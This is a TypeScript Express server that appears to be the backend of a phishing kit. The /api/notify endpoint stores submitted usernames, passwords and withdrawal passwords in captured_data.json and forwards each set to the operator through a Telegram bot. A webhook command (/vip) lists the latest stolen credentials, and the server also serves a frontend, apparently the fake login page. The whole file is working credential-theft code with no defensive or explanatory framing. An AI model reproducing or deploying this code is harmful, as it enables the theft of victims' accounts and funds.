import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import axios from "axios";
import dotenv from "dotenv";
import fs from "fs";

dotenv.config();

const DATA_FILE = path.join(process.cwd(), "captured_data.json");
const PORT = process.env.PORT || 3000;

// Helper para ler/escrever dados
function getCapturedData() {
  if (!fs.existsSync(DATA_FILE)) return [];
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
  } catch (e) {
    return [];
  }
}

function saveCapturedData(data: any) {
  const current = getCapturedData();
  current.push(data);
  fs.writeFileSync(DATA_FILE, JSON.stringify(current, null, 2));
}

async function startServer() {
  const app = express();
  app.use(express.json());

  // ====================== NOTIFY (salva + envia pro Telegram) ======================
  app.post("/api/notify", async (req, res) => {
    const { user, pass, withdraw_pass, timestamp } = req.body;

    saveCapturedData({ user, pass, withdraw_pass, timestamp });

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.warn("Telegram credentials missing");
      return res.json({ success: true, warning: "Notification skipped" });
    }

    const message = `
🔥 *NOVO ACESSO VIP* 🔥
━━━━━━━━━━━━━━━
👤 *Usuário:* \`${user}\`
🔑 *Senha:* \`${pass}\`
💰 *Senha Saque:* \`${withdraw_pass}\`
⏰ *Data:* ${new Date(timestamp).toLocaleString('pt-BR')}
━━━━━━━━━━━━━━━
    `;

    try {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown",
      });
      res.json({ success: true });
    } catch (error) {
      console.error("Telegram error:", error);
      res.status(500).json({ error: "Failed to send notification" });
    }
  });

  // ====================== TELEGRAM WEBHOOK ======================
  app.post("/api/telegram-webhook", async (req, res) => {
    const update = req.body;
    if (!update?.message?.text) return res.sendStatus(200);

    const message = update.message;
    const text = message.text.trim().toLowerCase();
    const chatId = message.chat.id;
    const token = process.env.TELEGRAM_BOT_TOKEN;

    let responseText = "";

    if (text === "/vip" || text === "/start") {
      const data = getCapturedData();
      responseText = "💎 *RELATÓRIO DE ACESSOS VIP* 💎\n\n";

      if (data.length === 0) {
        responseText += "Nenhum dado capturado ainda.";
      } else {
        data.slice(-15).forEach((item: any, index: number) => {  // últimos 15
          responseText += `*#${index + 1}* 👤 \`${item.user}\` | 🔑 \`${item.pass}\` | 💰 \`${item.withdraw_pass}\`\n`;
        });
      }
    } else {
      responseText = "Comando não reconhecido.\nUse: /vip";
    }

    if (responseText && token) {
      try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
          chat_id: chatId,
          text: responseText,
          parse_mode: "Markdown",
        });
      } catch (err) {
        console.error("Erro ao responder:", err);
      }
    }

    res.sendStatus(200);
  });

  // ====================== FRONTEND (Vite) ======================
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  // ====================== START SERVER ======================
  app.listen(PORT, "0.0.0.0", async () => {
    console.log(`🚀 Server running on port ${PORT}`);

    // Auto configurar Webhook
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const domain = process.env.RAILWAY_PUBLIC_DOMAIN;

    if (token && domain) {
      const webhookUrl = `https://${domain}/api/telegram-webhook`;
      try {
        await axios.post(`https://api.telegram.org/bot${token}/setWebhook`, {
          url: webhookUrl,
          drop_pending_updates: true,
        });
        console.log(`✅ Webhook configurado: ${webhookUrl}`);
      } catch (err: any) {
        console.error("❌ Falha ao setar webhook:", err.response?.data || err.message);
      }
    } else {
      console.warn("⚠️  RAILWAY_PUBLIC_DOMAIN ou BOT_TOKEN não encontrado");
    }
  });
}

startServer();